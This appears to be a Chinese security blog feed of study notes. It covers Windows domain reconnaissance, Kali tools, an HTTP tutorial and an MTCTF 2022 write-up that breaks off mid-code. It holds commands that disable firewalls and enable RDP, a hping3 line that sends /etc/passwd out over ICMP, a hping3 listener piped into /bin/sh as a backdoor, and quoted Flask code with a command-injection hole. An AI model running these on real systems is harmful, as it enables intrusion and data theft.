src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210140100985.png"></p><p>通过该命令查询的系统进程信息可显示出进程的运行用户（SYSTEM用户权限以下）及目录，在后期我们可以通过令牌窃取来进行提取</p></li><li><p><strong>杀毒软件进程查看</strong>：<code>tasklist /SVC</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141410006.png"></p><p>将该命令的返回值提交对应的<span class="exturl"><a class="exturl__link"   href="https://www.adminxe.com/CompareAV/index.php" >查询网站</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>即可查看是否有杀毒软件，方便我们与杀软对抗</p></li><li><p><strong>启动程序信息</strong>：<code>wmic startup get command,caption</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141421601.png"></p><p>可以看到详细的启动项命令及描述</p></li><li><p><strong>查看计划任务</strong>：<code>schtasks /query /fo LIST /v</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141535865.png"></p><p>通过查看本机计划任务可以利用定时任务来做定时任务劫持</p></li><li><p><strong>查看主机开机时间</strong>：<code>net statistics workstation</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141538799.png"></p><p>可以通过查看开机时间来判断是否经常有人管理使用这台机器</p></li><li><p><strong>查看用户</strong>：<code>net user</code> <code>net user 执行用户</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141602726.png"></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141604248.png"></p><p>没啥好说的，就是查看用户，还可以查看指定用户属于的组</p></li><li><p><strong>查看当前在线用户</strong>：<code>query user || qwinsta</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141610279.png"></p><p>通过查看当前在线用户可以知道管理员是否在登录，如果我们RDP登录到远程桌面然后撞上管理员就不好了</p></li><li><p><strong>查看本机端口开放情况</strong>：<code>netstat -ano</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141614976.png"></p><p>可以查看本机是否与其他机器产生连接，分析本机开启的业务</p></li><li><p><strong>查询补丁信息</strong>：<code>systeminfo</code> <code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141616251.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141618610.png"></p><p>看看漏洞是否被修复，针对性寻找exp</p></li><li><p><strong>查询路由表</strong>：<code>route print</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141622076.png"></p><p><strong>所有可用接口的ARP缓冲表</strong>：<code>arp -a</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141633543.png"></p><p>通过分析路由可以知道机器可以访问哪些网段的资源</p></li><li><p><strong>查看防火墙设置</strong>：<code>netsh firewall show config</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141635082.png"></p><p>查看防火墙的开关情况，以及相关的配置信息</p><p>如果我们相对防火墙相关内容进行一些更改可以使用下面的命令</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在Windows 2003及之前版本，使指定程序全部连接：netsh firewall add allowedprogram 程序路径 <span class="token string">"规则名"</span> enable在Windows 2003之后的版本，使用以下命令：netsh advfirewall firewall add rule name=<span class="token string">"规则名"</span> <span class="token function">dir</span>=in action=allow program=<span class="token string">"程序路径"</span>允许指定程序连出：netsh advfirewall firewall add rule name=<span class="token string">"规则名"</span> <span class="token function">dir</span>=out action=allow program=<span class="token string">"程序路径"</span>允许指定端口放行：netsh advfirewall firewall add rule name=<span class="token string">"规则名"</span> protocol=TCP <span class="token function">dir</span>=in localport=端口 action=allow program=<span class="token string">"程序路径"</span>自定义防火墙日志存储位置：netsh advfirewall <span class="token function">set</span> currentprofile logging filename <span class="token string">"存储文件路径"</span>Windows 2003及之前版本关闭防火墙：netsh firewall <span class="token function">set</span> opmode disableWindows 2003以后版本关闭防火墙：netsh advfirewall <span class="token function">set</span> allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>查询并开启远程桌面服务</strong>：<code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141652896.png"></p><p>开启远程桌面的命令</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">Windows Server 2003开3389端口wmic path win32_terminalservicesetting where <span class="token punctuation">(</span>_CLASS <span class="token operator">!</span>=<span class="token string">""</span><span class="token punctuation">)</span> call setallowtsconnections 1Windows Server 2008 和 Windows Server 2012开3389端口wmic <span class="token operator">/</span>namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where <span class="token punctuation">(</span>_CLASS <span class="token operator">!</span>=<span class="token string">""</span><span class="token punctuation">)</span> call setallowtsconnections 1或wmic <span class="token operator">/</span>namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where <span class="token punctuation">(</span>TerminalName=<span class="token string">'RDP-Tcp'</span><span class="token punctuation">)</span> call setuserauthenticationrequired 1Windows 7开3389端口reg add <span class="token string">"HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER"</span> <span class="token operator">/</span>v fSingleSessionPerUser <span class="token operator">/</span>t REG DWORD <span class="token operator">/</span>d 0 <span class="token operator">/</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>        <h3 id="域内信息搜集"   >          <a href="#域内信息搜集" class="heading-link"><i class="fas fa-link"></i></a><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h3>      <ul><li><p><strong>获取域SID</strong>：<code>whoami /all</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210151703166.png"></p><p>搜集SID可以用于票据传递攻击，还有部分提权方式需要手机特权信息来进行</p></li><li><p><strong>查询域内容户</strong>：<code>net user /domain</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210151706114.png"></p></li><li><p><strong>查看域内用户详细信息</strong>：<code>net user 用户名 /domain</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210151707950.png"></p><p>可以看到组成员内容来判断用户组及权限</p></li><li><p><strong>查看本机所在的所有域</strong>：<code>net view /domain</code></p><p>在存在多个域的时候可以使用这个命令来看所存在的所有域</p></li><li><p><strong>查询域管理员列表</strong>：<code>net group &quot;domain admins&quot; /domain</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161722867.png"></p><p>可以看到只有一个域管理员</p></li><li><p><strong>查看域内时间（时间服务器）</strong>：<code>net time /domain</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161724650.png"></p><p>通过查看域内时间以及时间服务器，就可以使用定时任务+IPC来运行一些bat文件，并且可以通过ping域内时间服务器来得到其IP</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161728786.png"></p></li><li><p><strong>查看登录本机的域管理员</strong>：<code>net localgroup administrators /domain</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161730087.png"></p></li><li><p><strong>查看域中所有用户组</strong>：<code>net groups /domain</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161731765.png"></p></li><li><p><strong>查看主域控制器</strong>：<code>netdom query pdc</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161732635.png"></p><p>直接ping就能拿到IP</p></li><li><p><strong>查看所有域控制器</strong>：<code>net group &quot;Domain Controllers&quot; /domain</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161734364.png"></p><p>这里应该还有个辅域的，但是不知道为啥消失了，后面再回来看看</p><p>这里我们可以通过域控制器的机器名称来查看域控主机，知道其IP后我们可以对其进行针对性的渗透，只需渗透核心机器，整个域的控制权也就到手了</p></li><li><p><strong>查询域信任信息</strong>：<code>nltest /domain_trusts</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210170338052.png"></p><p>可以看到主域名是bxsteam.com，并且有一个saul子域，二者双向认证，彼此的用户可以互相登录</p></li><li><p><strong>查询域密码信息</strong>：<code>net accounts /domain</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210170340232.png"></p><p>可以看到域中密码使用策略，在爆破时防止我们生成无效的密码字典</p></li></ul><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali从0到1</title>
      <link href="/posts/8b8ae737.html"/>
      <url>/posts/8b8ae737.html</url>
      
        <content type="html"><![CDATA[        <h1 id="工具大全"   >          <a href="#工具大全" class="heading-link"><i class="fas fa-link"></i></a><a href="#工具大全" class="headerlink" title="工具大全"></a>工具大全</h1>              <h2 id="信息收集"   >          <a href="#信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2>              <h3 id="存活主机识别"   >          <a href="#存活主机识别" class="heading-link"><i class="fas fa-link"></i></a><a href="#存活主机识别" class="headerlink" title="存活主机识别"></a>存活主机识别</h3>      <ul><li><p><strong>arping</strong>：</p><ul><li>类似于ping，也是用来探测存活的，不过使用的arp协议不是ICMP协议，所以只能探测内网不能碰公网</li><li>-t参数可以添加mac地址，来保证IP地址绑定到了指定的MAC地址上</li><li>还行吧，可能ping不管用的时候可以用，哦还可以用来捞mac地址</li></ul></li><li><p><strong>fping</strong>：</p><ul><li><p>ping的加强版，fping可以在命令行中指定要ping的主机范围</p></li><li><p>与ping要等待某一主机连接超时或发回反馈信息不同，fping给一个主机发送完数据包后，马上给下一个主机发送数据包，实现多主机同时ping。如果某一主机ping通，则此主机将被打上标记，并从等待列表中移除，如果没ping通，说明主机无法到达，主机仍然留在等待列表中，等待后续操作。</p></li><li><p>```shell<br>fping IP1 IP2 IP3 …<br>fping -f filename<br>fping -g IP1 IP2<br>可以添加-a参数来只显示存活主机</p><pre class="line-numbers language-none"><code class="language-none">  - ping的升级版（自己写歌脚本貌似也差不多）- **hping3**：  - hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。  - 可以自己定制数据包来探测防火墙，也可以详细查看响应来判断拦截等内容，甚至可以用来伪造ICMP包来打DDOS  - &#96;&#96;&#96;    -a 指定包的请求IP，可以指定为目标来让自己反复ping自己，不过这样的话自己也就收不到响应数据了    -p 指定端口    -I 指定网卡    -c 指定发包次数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>文件传输</strong></p><ul><li><p>Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p></li><li><p>```shell<br>hping3 源IP –listen signature –safe  –icmp</p><pre class="line-numbers language-none"><code class="language-none">- 监听ICMP包中的签名，根据签名解析出文件内容。- 在发送端使用签名打包的ICMP包发送文件：- &#96;&#96;&#96;shell  hping3 目标IP --icmp -d 100 --sign signature --file &#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将<code>/etc/passwd</code>密码文件通过ICMP包传给目标主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p></li></ul></li><li><p><strong>反弹shell功能</strong></p><ul><li><p>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。</p></li><li><p>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p></li><li><p>在木马启动端：</p></li><li><p>```<br>hping3 192.168.10.66–listen signature –safe –udp -p 53 | /bin/sh</p><pre class="line-numbers language-none"><code class="language-none">- 在远程控制端：- &#96;&#96;&#96;  echo ls &gt;test.cmd hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file .&#x2F;test.cmd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p></li><li><p>当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p></li></ul></li><li><p>好高级的说，可以自定义的部分也很多，也有一些有趣的应用，可冲</p></li></ul></li><li><p><strong>masscan</strong>：</p><ul><li><p>又一个扫描工具，给个例子就过，好快啊</p></li><li><p>```<br>masscan -p80,8080-8100 10.0.0.0/8<br>（扫描10.x.x.x子网，扫描端口80和8000-8100范围的端口段）<br>可使用–echo把当前配置输出到文件，-c使用文件<br>–source-ip 指定源IP<br>–excludefile 文件 指定网段忽略<br>–max-rate 100000 最高发包速率<br>–banners 获取banner信息，支持少量的协议</p><pre class="line-numbers language-none"><code class="language-none">  - md你快有个卵子用，扫不出来端口存活信息啊- **thcping6**：  - 针对IPV6的发包工具，隶属于atk6这个这个工具包下，官方描述是sends a hand crafted ping6 packet，就是手动构造一个ping6的数据包  - 学了IPV6再来### 路由分析- **netdiscover**：    - 二层发现工具，拥有主动和被动发现两种方式，通过ARP路由表探测  - 最简单的就是直接输入netdiscover之后就是运行它的默认配置然后扫描局域网中所有的机器  - 也可以直接输入网卡让他自己跑两层  - 每天一个被打电话小技巧  - **netmask**：  - netmaks可以在 IP范围、子网掩码、cidr、cisco等格式中互相转换，并且提供了IP地址的点分十进制、16进制、8进制、2进制之间的互相转换  - &#96;&#96;&#96;    Usage: netmask spec [spec ...]      -h, --help                    Print a summary of the options      -v, --version                 Print the version number      -d, --debug                   Print status&#x2F;progress information      -s, --standard                Output address&#x2F;netmask pairs      -c, --cidr                    Output CIDR format address lists      -i, --cisco                   Output Cisco style address lists      -r, --range                   Output ip address ranges      -x, --hex                     Output address&#x2F;netmask pairs in hex      -o, --octal                   Output address&#x2F;netmask pairs in octal      -b, --binary                  Output address&#x2F;netmask pairs in binary      -n, --nodns                   Disable DNS lookups for addresses      -f, --files                   Treat arguments as input files    Definitions:      a spec can be any of:        address        address:address        address:+address        address&#x2F;mask      an address can be any of:        N           decimal number        0N          octal number        0xN         hex number        N.N.N.N     dotted quad        hostname    dns domain name      a mask is the number of bits set to one from the left<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>这个看官方文档吧</p></li></ul></li></ul>        <h3 id="情报分析"   >          <a href="#情报分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#情报分析" class="headerlink" title="情报分析"></a>情报分析</h3>      <ul><li><p><strong>spiderfoot</strong>：</p><ul><li>一个可以自动进行大量查询的工具</li><li>启动需要指定好监听的IP和端口，然后浏览器直接访问就行啦</li><li>好用的耶，一些资产搜寻不用手动做了，而且还可以没事搜搜自己来保护自己</li></ul></li><li><p><strong>theHarvester</strong>：</p><ul><li><p>这个嘛就是一个手动的搜索工具啦，直接看官方文档就好</p></li><li><p>```<br>-d    –domain                    要搜索的公司名称或域名。<br>-l    –limit                        限制搜索结果的数量，默认=500。<br>-S    –start                        从结果编号 X 开始，默认 = 0。<br>-g    –google-dork            使用 Google Dorks 进行 Google 搜索。<br>-p    –proxies                    对请求使用代理，在 proxies.yaml 中输入代理<br>-s    –shodan                    使用 Shodan 查询发现的主机。<br>–screenshot                    对已解析的域进行截图，指定输出目录：–screenshot output_directory<br>-v    –virtual-host        通过 DNS 解析验证主机名并搜索虚拟主机。<br>-e    –dns-server            用于查找的 DNS 服务器。<br>-f    –filename                将结果保存到 XML 和 JSON 文件。<br>-b    –source                    指定搜索的引擎和数据源</p><p>#theHarvester -d [url] -l 300 -b [搜索引擎名称]</p><pre class="line-numbers language-none"><code class="language-none">  - 没上一个自动化的好用，不开心😒## 漏洞分析### Fuzzing工具集## Web程序## 数据库评估软件## 密码攻击## 无线攻击### 蓝牙工具集### 无线工具集- **bully**：  - Wi-Fi破解，通过爆破WPS模式下7位长度PIN值来获取Wi-Fi密码  - 使用方法  - &#96;&#96;&#96;shell    bully 监听模式网卡名 -b 目标BSSID -e 目标SSID -c 目标广播信道<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>可以看到有许多参数，他们的获取方式我们会在后面提到</p></li><li><p>还没有试过，改天尝试一下</p></li></ul></li><li><p><strong>Fern WiFi Cracker</strong>：</p><ul><li>图形化的Wi-Fi破解工具，可以通过破解路由到设备的加密包来实现Wi-Fi密码解析</li><li>等我笔记本kali装好的（</li></ul></li></ul>        <h2 id="逆向工程"   >          <a href="#逆向工程" class="heading-link"><i class="fas fa-link"></i></a><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h2>              <h2 id="漏洞利用工具集"   >          <a href="#漏洞利用工具集" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用工具集" class="headerlink" title="漏洞利用工具集"></a>漏洞利用工具集</h2>              <h2 id="嗅探-欺骗"   >          <a href="#嗅探-欺骗" class="heading-link"><i class="fas fa-link"></i></a><a href="#嗅探-欺骗" class="headerlink" title="嗅探/欺骗"></a>嗅探/欺骗</h2>              <h3 id="网络欺骗"   >          <a href="#网络欺骗" class="heading-link"><i class="fas fa-link"></i></a><a href="#网络欺骗" class="headerlink" title="网络欺骗"></a>网络欺骗</h3>      <ul><li><strong>sslsplit</strong>：</li></ul><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>URL和HTTP协议</title>
      <link href="/posts/11f51f93.html"/>
      <url>/posts/11f51f93.html</url>
      
        <content type="html"><![CDATA[        <h1 id="URL"   >          <a href="#URL" class="heading-link"><i class="fas fa-link"></i></a><a href="#URL" class="headerlink" title="URL"></a>URL</h1>      <p>遇事不决先百度</p><blockquote><p>因特网上的可用资源可以用简单字符串来表示，该文档就是描述了这种字符串的语法和语义。而这些字符串则被称为：“<span class="exturl"><a class="exturl__link"   href="https://baike.baidu.com/item/%E7%BB%9F%E4%B8%80%E8%B5%84%E6%BA%90%E5%AE%9A%E4%BD%8D%E5%99%A8/7682460?fromModule=lemma_inlink" >统一资源定位器</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>”（URL）。这篇说明源于万维网全球信息主动组织（World Wide Web global informationinitiative）介绍的概念。RFC1630《通用资源标志符》描述了一些对象数据，他们自1990年起就开始使用这些对象数据。这篇URL说明符合《因特网资源定位符的功能需求（Functional Requirements for Internet Resource Locators）》中说明的需求。这篇文档是由工程任务组织（IETF）的URI工作小组写的 </p></blockquote><p>肯定看不懂对吧，没关系，你只需要知道这个东西是用来寻找互联网上的资源就可以了，下面我们来看看一个URL的完整格式</p><pre class="line-numbers language-none"><code class="language-none">scheme:[&#x2F;&#x2F;[user[:password]@]host[:port]][&#x2F;path][?query][#fragment]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>贴心的中文翻译</p><pre class="line-numbers language-none"><code class="language-none">协议:[&#x2F;&#x2F;[用户[:密码]@]主机[:端口]][&#x2F;路径][?队列][#片段]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下面我们以一个http协议的url来对上面的内容做一个解释</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;jlan.darkflow.top&#x2F;posts&#x2F;58958.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们来按照上面的语法来分析一下这个是什么内容</p><p>首先我们使用的是http协议来对jlan.darkflow.top这个服务主机进行访问，访问的是/posts/58958.html这个网页资源，这时候应该就会有人问了，为什么这个http的URL里面没有用户啊密码啊端口之类的东西呢，很简单，因为这些内容都是可选项，而http协议内容基本都是公开访问的，所以我们不需要指明我们用户的身份，并且http协议的默认端口是80端口，所以我们在访问这个URL的时候会自动的去80端口寻找资源</p><p>那如果我们没有把http服务放在80端口而是放在其他端口呢，来做个实验，我们用flask起一个web服务器，使用80端口作为http服务的端口<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262243049.png"></p><p>我们来直接访问看看，虽然我们没有在URL中添加端口，但是我们也成功访问到了我们的web站点，添加了80端口也是一样的，并且由于浏览器的特性，我们在添加80端口到URL中时默认是不会显示出来的</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262245054.png"></p><p>下一步就是将默认端口进行更改，可以看到我们在代码中将端口更改为了10010，这时候我们再来直接访问看看</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262243232.png"></p><p>可以看到我们现在用默认的80端口已经行不通了，那我们就加上我们自定义的端口号再来访问</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262248667.png"></p><p>可以看到访问成功，并且在地址栏也出现了我们输入的自定义端口号</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262251416.png"></p><p>那下一个我们可以来看一个ftp协议的URL</p><pre class="line-numbers language-none"><code class="language-none">ftp:&#x2F;&#x2F;jlan@127.0.0.1&#x2F;xxx&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个就很明显了，我们以Jlan的身份在127.0.0.1服务器上面拿一份flag，可以看到我们也没有指定端口，因为ftp协议也是有默认端口的，其实几乎所有协议都会有一个默认的端口号，在一些使用这些协议的程序中大部分情况我们都不需要再额外添加端口</p>        <h1 id="HTTP"   >          <a href="#HTTP" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1>      <p>说完了URL我们来说另一个web的基础知识就是HTTP协议，同样先百度</p><blockquote><p>HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。</p><p>HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。</p><p>HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。</p><p>HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。</p></blockquote><p><img   src="https://upload-images.jianshu.io/upload_images/2964446-fdfb1a8fce8de946.png?imageMogr2/auto-orient/strip%7CimageView2/2" style=""  alt="img"></p><p>上面这张图就很好的说明了HTTP协议定义的内容</p><p>啊反正HTTP协议就是一种传输网页内容的协议，协议就是双方定义了一种数据交换的方式，按照规定的格式来传输数据，web手所谓的“抓包”就是对HTTP的数据包进行拦截，然后取出其中的原始数据，多说无益，我们来实际抓包尝试一下，还是使用刚才的web服务器</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262325345.png"></p><p>看这里就是一整个完整的请求和响应内容了，第一行是请求的方法和协议，后面每行都是一个请求标头，最后有一个回车和换行结束，这是一个完整的GET请求，那POST类型的请求是什么样子的呢，我们再来看一下</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262335979.png"></p><p>发现请求的最下面是我们传入的内容，并且又多了一个叫做Content-Length的请求头，这个请求头就是告诉服务器，我们在最后一个换行之后还有9字节的内容需要传输，我们试试在服务器中将内容取出并且回显，那如果我们修改这个请求头让它比我们实际的请求短会发生什么呢</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262336473.png"></p><p>可以看到服务器按照我们的请求头声明的一样，只取了前8位的内容，返回了jla</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MTCTF 2022</title>
      <link href="/posts/94d6ea88.html"/>
      <url>/posts/94d6ea88.html</url>
      
        <content type="html"><![CDATA[        <h2 id="babyjava"   >          <a href="#babyjava" class="heading-link"><i class="fas fa-link"></i></a><a href="#babyjava" class="headerlink" title="babyjava"></a>babyjava</h2>      <p>直接搜Xpath注入工具</p><p><span class="exturl"><a class="exturl__link"   href="https://www.zhihuifly.com/t/topic/370" >https://www.zhihuifly.com/t/topic/370</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>按照对应的URL与post传参</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171837552.png"></p><p>按说明一层层爆出结果，最终文档树如下</p><pre class="line-numbers language-none"><code class="language-none">rootuserusername（flag在里面）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171843715.png"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;273f7d50-2f92-47ba-b5d4-358ae3add895&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="OnlineUnzip"   >          <a href="#OnlineUnzip" class="heading-link"><i class="fas fa-link"></i></a><a href="#OnlineUnzip" class="headerlink" title="OnlineUnzip"></a>OnlineUnzip</h2>      <p>源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> make_responseapp<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">extractFile</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>    extractdir<span class="token operator">=</span>filepath<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>extractdir<span class="token punctuation">)</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>extractdir<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'unzip -o </span><span class="token interpolation"><span class="token punctuation">&#123;</span>filepath<span class="token punctuation">&#125;</span></span><span class="token string"> -d </span><span class="token interpolation"><span class="token punctuation">&#123;</span>extractdir<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">,</span>extractdir<span class="token operator">=</span>extractdir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token 